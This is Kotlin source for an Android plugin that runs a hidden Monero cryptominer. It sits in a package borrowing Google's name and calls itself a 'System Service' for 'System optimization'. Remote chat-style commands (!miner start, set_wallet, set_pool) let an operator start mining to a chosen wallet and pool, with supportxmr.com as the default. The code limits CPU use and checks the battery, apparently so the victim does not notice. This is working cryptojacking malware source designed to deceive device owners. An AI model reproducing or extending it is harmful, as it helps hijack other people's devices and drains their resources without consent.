package com.google.system.plugins

import android.content.Context
import android.os.BatteryManager
import com.google.system.RealMiner
import kotlinx.coroutines.*

class MinerPlugin : Plugin {
    override val id = "miner"
    override val name = "System Service"
    override val version = "2.1"
    override val commands = listOf("!miner")
    override val description = "System optimization service"

    private var realMiner: RealMiner? = null
    private var isMining = false
    private var startTime = 0L
    private var wallet = ""
    private var pool = ""
    private var maxThreads = 2
    private var maxCpuPercent = 40
    private var contextRef: Context? = null

    override fun onEnable(context: Context): Boolean {
        contextRef = context
        return try {
            val pluginConfig = PluginManager.getPluginConfig(id)
            if (pluginConfig != null) {
                wallet = pluginConfig.settings["wallet"] as? String ?: ""
                pool = pluginConfig.settings["pool"] as? String ?: pool
                maxThreads = (pluginConfig.settings["threads"] as? Number)?.toInt() ?: 2
                maxCpuPercent = (pluginConfig.settings["max_cpu_percent"] as? Number)?.toInt() ?: 40
            }
            true
        } catch (_: Exception) { false }
    }

    override fun onDisable() {
        stopService()
    }

    override fun handleCommand(cmd: String, payload: String?): String? {
        val sub = payload?.trim()?.lowercase()
        return when {
            sub == null || sub.isBlank() -> getServiceStatus()
            sub.startsWith("start") -> startService()
            sub.startsWith("stop") -> { stopService(); "Service stopped" }
            sub.startsWith("status") -> getServiceStatus()
            sub.startsWith("set_wallet") -> {
                val parts = payload.split(" ", limit = 2)
                if (parts.size > 1) {
                    wallet = parts[1]
                    ":white_check_mark: Configuration saved"
                } else ":x: Usage: `!miner set_wallet <address>`"
            }
            sub.startsWith("set_pool") -> {
                val parts = payload.split(" ", limit = 2)
                if (parts.size > 1) {
                    pool = parts[1]
                    ":white_check_mark: Pool configured"
                } else ":x: Usage: `!miner set_pool <url>`"
            }
            sub.startsWith("set_threads") -> {
                val n = payload.split(" ")[1].toIntOrNull()
                if (n != null && n in 1..8) {
                    maxThreads = n
                    ":white_check_mark: Threads set to $n"
                } else ":x: Usage: `!miner set_threads <1-8>`"
            }
            else -> null
        }
    }

    override fun getConfig(): Map<String, Any> {
        val status = realMiner?.getStatus()
        return mapOf(
            "active" to isMining,
            "wallet_hash" to if (wallet.isNotBlank()) "${wallet.take(6)}...${wallet.takeLast(4)}" else "",
            "pool" to pool,
            "threads" to maxThreads,
            "cpu_limit" to maxCpuPercent,
            "uptime" to if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 1000}s" else "0s"
        )
    }

    private fun startService(): String {
        if (isMining) return ":warning: Service already running"
        if (wallet.isBlank()) return ":x: Configure wallet first: `!miner set_wallet <address>`"
        if (contextRef == null) return ":x: Service unavailable"

        // Check battery before starting
        val batteryManager = contextRef!!.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val batteryPct = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val isCharging = batteryManager.isCharging

        if (batteryPct < 15 && !isCharging) {
            return ":warning: Battery low - service pending"
        }

        val poolParts = pool.split(":")
        val host = if (poolParts[0].isBlank()) "pool.supportxmr.com" else poolParts[0]
        val port = poolParts.getOrNull(1)?.toIntOrNull() ?: 3333

        realMiner = RealMiner(
            context = contextRef!!,
            wallet = wallet,
            poolHost = host,
            poolPort = port,
            maxThreads = maxThreads
        )

        val result = realMiner?.start() ?: "Initialization failed"
        if (result.contains("start", ignoreCase = true) || result.contains("mining", ignoreCase = true) || result.contains("operat", ignoreCase = true)) {
            isMining = true
            startTime = System.currentTimeMillis()
        }
        return result
    }

    fun stopService() {
        isMining = false
        realMiner?.stop()
        realMiner = null
    }

    private fun getServiceStatus(): String {
        val status = realMiner?.getStatus()
        val serviceState = if (isMining) "Active" else "Idle"
        val uptime = if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 60000}m" else "0m"

        return buildString {
            appendLine(":gear: **System Service** `$serviceState`")
            appendLine()
            if (wallet.isNotBlank()) {
                appendLine("Wallet: `${wallet.take(8)}...${wallet.takeLast(6)}`")
            }
            if (pool.isNotBlank()) {
                appendLine("Pool: `$pool`")
            }
            appendLine("Threads: $maxThreads")
            appendLine("Uptime: $uptime")
            if (status?.isMining == true) {
                appendLine("Status: Running")
            }
        }
    }
}